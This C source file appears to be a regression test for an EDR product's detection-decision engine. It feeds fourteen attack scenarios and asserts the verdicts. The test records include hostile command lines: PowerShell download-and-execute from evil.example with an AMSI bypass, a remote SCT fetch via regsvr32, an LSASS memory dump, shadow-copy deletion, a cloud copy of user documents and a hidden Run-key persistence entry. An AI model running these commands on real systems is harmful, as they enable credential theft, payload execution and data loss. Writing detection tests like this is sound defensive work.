#include "edr/detection_decision.h"

#include <assert.h>
#include <stdio.h>
#include <string.h>

typedef struct {
  const char *name;
  EdrBehaviorRecord record;
  float min_confidence;
  int expect_pmfe;
  int expect_minidump;
  const char *must_reason;
  const char *must_context;
} DetectionScenario;

static void init_record(EdrBehaviorRecord *r) {
  memset(r, 0, sizeof(*r));
  r->type = EDR_EVENT_PROCESS_CREATE;
  r->priority = 1u;
}

static DetectionScenario scenario_alert_2001(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "ALERT-2001 SQUIRRELWAFFLE ISO/LNK regsvr32 remote SCT";
  init_record(&s.record);
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "regsvr32.exe");
  snprintf(s.record.exe_path, sizeof(s.record.exe_path), "%s", "C:\\Windows\\System32\\regsvr32.exe");
  snprintf(s.record.parent_name, sizeof(s.record.parent_name), "%s", "explorer.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s",
           "regsvr32.exe /s /n /u /i:https://cdn.example.test/update/a.sct scrobj.dll");
  s.min_confidence = 0.70f;
  s.expect_pmfe = 1;
  s.must_reason = "script_or_encoded_payload";
  s.must_context = "stream_forensic_combo";
  return s;
}

static DetectionScenario scenario_powershell_download_amsi(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "PowerShell IEX download with AMSI bypass";
  init_record(&s.record);
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "powershell.exe");
  snprintf(s.record.exe_path, sizeof(s.record.exe_path), "%s",
           "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
  snprintf(s.record.parent_name, sizeof(s.record.parent_name), "%s", "winword.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s",
           "powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1'); "
           "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')");
  s.min_confidence = 0.80f;
  s.expect_pmfe = 1;
  s.must_reason = "script_or_encoded_payload";
  s.must_context = "pmfe_scan";
  return s;
}

static DetectionScenario scenario_process_injection(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "Cobalt-like remote thread process injection";
  init_record(&s.record);
  s.record.type = EDR_EVENT_PROCESS_INJECT;
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "rundll32.exe");
  snprintf(s.record.parent_name, sizeof(s.record.parent_name), "%s", "powershell.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s", "rundll32.exe C:\\Users\\Public\\beacon.dll,StartW");
  s.min_confidence = 0.70f;
  s.expect_pmfe = 1;
  s.must_reason = "process_injection_signal";
  s.must_context = "memory_event_high_signal";
  return s;
}

static DetectionScenario scenario_lsass_dump(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "LSASS dump via comsvcs MiniDump";
  init_record(&s.record);
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "rundll32.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s",
           "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\ProgramData\\lsass.dmp full");
  s.min_confidence = 0.55f;
  s.expect_pmfe = 1;
  s.must_reason = "credential_dump_indicator";
  s.must_context = "credential_memory_combo";
  return s;
}

static DetectionScenario scenario_shellcode_smb(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "SMB shellcode / exploit payload";
  init_record(&s.record);
  s.record.type = EDR_EVENT_PROTOCOL_SHELLCODE;
  s.record.net_dport = 445u;
  snprintf(s.record.net_dst, sizeof(s.record.net_dst), "%s", "10.0.2.15");
  snprintf(s.record.script_snippet, sizeof(s.record.script_snippet), "%s",
           "detector=yara rule=EternalBlue_MS17_010 score=1.0 proto=smb2 mitre=T1210");
  s.min_confidence = 0.88f;
  s.expect_pmfe = 1;
  s.must_reason = "shellcode_signal";
  s.must_context = "\"engine\":\"shellcode\"";
  return s;
}

static DetectionScenario scenario_webshell(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "WebShell file drop";
  init_record(&s.record);
  s.record.type = EDR_EVENT_WEBSHELL_DETECTED;
  snprintf(s.record.file_path, sizeof(s.record.file_path), "%s", "/var/www/html/upload/shell.php");
  snprintf(s.record.script_snippet, sizeof(s.record.script_snippet), "%s",
           "detector=yara rule=PHP_Webshell_Eval score=0.91 proto=http mitre=T1505.003");
  s.min_confidence = 0.82f;
  s.expect_pmfe = 1;
  s.must_reason = "webshell_signal";
  s.must_context = "webshell_files";
  return s;
}

static DetectionScenario scenario_ransom_recovery_tamper(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "Ransomware recovery tamper";
  init_record(&s.record);
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "vssadmin.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s", "vssadmin.exe delete shadows /all /quiet");
  s.min_confidence = 0.42f;
  s.expect_pmfe = 0;
  s.must_reason = "ransom_recovery_tamper";
  s.must_context = "\"engine\":\"p0_rule\"";
  return s;
}

static DetectionScenario scenario_exfil_staging(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "Data exfiltration staging and cloud copy";
  init_record(&s.record);
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "rclone.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s",
           "rclone copy C:\\Users\\alice\\Documents remote:bucket --transfers 16");
  s.min_confidence = 0.34f;
  s.expect_pmfe = 0;
  s.must_reason = "exfil_staging_or_upload";
  s.must_context = "\"engine\":\"p0_rule\"";
  return s;
}

static DetectionScenario scenario_scriptblock_amsi_etw(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "AMSI / ScriptBlock / ETW script content";
  init_record(&s.record);
  s.record.type = EDR_EVENT_SCRIPT_POWERSHELL;
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "powershell.exe");
  snprintf(s.record.parent_name, sizeof(s.record.parent_name), "%s", "winword.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s",
           "powershell.exe -nop -enc SQBFAFgA");
  snprintf(s.record.script_snippet, sizeof(s.record.script_snippet), "%s",
           "sensor=scriptblock provider=Microsoft-Windows-PowerShell scriptblock_id=9 "
           "content=IEX DownloadString AmsiUtils amsiInitFailed");
  s.min_confidence = 0.85f;
  s.expect_pmfe = 1;
  s.must_reason = "script_sensor_content";
  s.must_context = "\"script_sensor\":true";
  return s;
}

static DetectionScenario scenario_tls_ja3_sni_cert_anomaly(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "JA3 / SNI / certificate anomaly";
  init_record(&s.record);
  s.record.type = EDR_EVENT_NET_TLS_HANDSHAKE;
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "rundll32.exe");
  snprintf(s.record.net_dst, sizeof(s.record.net_dst), "%s", "203.0.113.44");
  s.record.net_dport = 443u;
  s.record.cert_revoked_ancestor = 1u;
  snprintf(s.record.script_snippet, sizeof(s.record.script_snippet), "%s",
           "ja3=72a589da586844d7f0818ce684948eea ja3_rare=1 sni=cdn-login.example "
           "sni_mismatch=1 cert_self_signed=1 mitre=T1071.001");
  s.min_confidence = 0.70f;
  s.expect_pmfe = 0;
  s.must_reason = "tls_ja3_sni_cert_anomaly";
  s.must_context = "\"tls_anomaly\":true";
  return s;
}

static DetectionScenario scenario_ransom_behavior_counters(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "Ransomware file-rate / extension / entropy counters";
  init_record(&s.record);
  s.record.type = EDR_EVENT_FILE_WRITE;
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "backup_update.exe");
  snprintf(s.record.file_path, sizeof(s.record.file_path), "%s", "C:\\Users\\alice\\Documents\\q1.locked");
  snprintf(s.record.script_snippet, sizeof(s.record.script_snippet), "%s",
           "ransom_counter=1 file_rate=140 ext_burst=31 entropy_delta=2.4 extension_burst=1 mitre=T1486");
  s.min_confidence = 0.46f;
  s.expect_pmfe = 0;
  s.must_reason = "ransom_behavior_counter";
  s.must_context = "\"ransom_behavior\":true";
  return s;
}

static DetectionScenario scenario_webshell_ast_token_semantic(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "WebShell AST / token semantic signal";
  init_record(&s.record);
  s.record.type = EDR_EVENT_FILE_WRITE;
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "php-fpm");
  snprintf(s.record.file_path, sizeof(s.record.file_path), "%s", "/var/www/html/upload/img.php");
  snprintf(s.record.script_snippet, sizeof(s.record.script_snippet), "%s",
           "detector=semantic ast_score=0.91 token_score=0.88 ast=webshell token=webshell "
           "features=base64_decode,assert,cmd mitre=T1505.003");
  s.min_confidence = 0.55f;
  s.expect_pmfe = 1;
  s.must_reason = "webshell_ast_token_semantic";
  s.must_context = "\"webshell_semantic\":true";
  return s;
}

static DetectionScenario scenario_registry_runkey_persistence(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "Registry Run key persistence";
  init_record(&s.record);
  s.record.type = EDR_EVENT_REG_SET_VALUE;
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "powershell.exe");
  snprintf(s.record.parent_name, sizeof(s.record.parent_name), "%s", "winword.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s",
           "powershell.exe Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run updater");
  snprintf(s.record.reg_key_path, sizeof(s.record.reg_key_path), "%s",
           "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
  snprintf(s.record.reg_value_name, sizeof(s.record.reg_value_name), "%s", "Updater");
  snprintf(s.record.reg_value_data, sizeof(s.record.reg_value_data), "%s",
           "powershell.exe -w hidden -enc SQBFAFgA");
  snprintf(s.record.reg_op, sizeof(s.record.reg_op), "%s", "set_value");
  s.min_confidence = 0.55f;
  s.expect_pmfe = 0;
  s.must_reason = "persistence_change_indicator";
  s.must_context = "\"persistence_change\":true";
  return s;
}

static DetectionScenario scenario_silverfox_public501_downloader(void) {
  DetectionScenario s;
  memset(&s, 0, sizeof(s));
  s.name = "Silver Fox Public 501 downloader to Golden payload";
  init_record(&s.record);
  snprintf(s.record.process_name, sizeof(s.record.process_name), "%s", "url.exe");
  snprintf(s.record.exe_path, sizeof(s.record.exe_path), "%s", "C:\\Users\\Public\\501\\url.exe");
  snprintf(s.record.parent_name, sizeof(s.record.parent_name), "%s", "explorer.exe");
  snprintf(s.record.cmdline, sizeof(s.record.cmdline), "%s",
           "C:\\Users\\Public\\501\\url.exe https://cdn.example.invalid/invoice.bin "
           "-o C:\\ProgramData\\Golden\\Setup64.exe");
  snprintf(s.record.file_path, sizeof(s.record.file_path), "%s", "C:\\ProgramData\\Golden\\Setup64.exe");
  s.min_confidence = 0.86f;
  s.expect_pmfe = 1;
  s.must_reason = "silverfox_attack_chain_indicator";
  s.must_context = "\"silverfox_attack_chain\":true";
  return s;
}

static void run_scenario(const DetectionScenario *s) {
  EdrBehaviorRecord r = s->record;
  EdrDetectionDecision d;
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(!d.suppress);
  assert(d.confidence >= s->min_confidence);
  assert((int)d.trigger_pmfe_scan == s->expect_pmfe);
  assert((int)d.trigger_single_process_minidump == s->expect_minidump);
  assert(strstr(d.reason, s->must_reason) != NULL);
  assert(strstr(r.detection_context, s->must_context) != NULL);
  assert(strstr(r.detection_context, "\"detection_trigger\"") != NULL);
  assert(strstr(r.detection_context, "\"recommended_forensics\"") != NULL);
}

int main(void) {
  DetectionScenario scenarios[] = {
      scenario_alert_2001(),
      scenario_powershell_download_amsi(),
      scenario_process_injection(),
      scenario_lsass_dump(),
      scenario_shellcode_smb(),
      scenario_webshell(),
      scenario_ransom_recovery_tamper(),
      scenario_exfil_staging(),
      scenario_scriptblock_amsi_etw(),
      scenario_tls_ja3_sni_cert_anomaly(),
      scenario_ransom_behavior_counters(),
      scenario_webshell_ast_token_semantic(),
      scenario_registry_runkey_persistence(),
      scenario_silverfox_public501_downloader(),
  };
  for (size_t i = 0; i < sizeof(scenarios) / sizeof(scenarios[0]); i++) {
    run_scenario(&scenarios[i]);
  }
  puts("detection_regression ok");
  return 0;
}
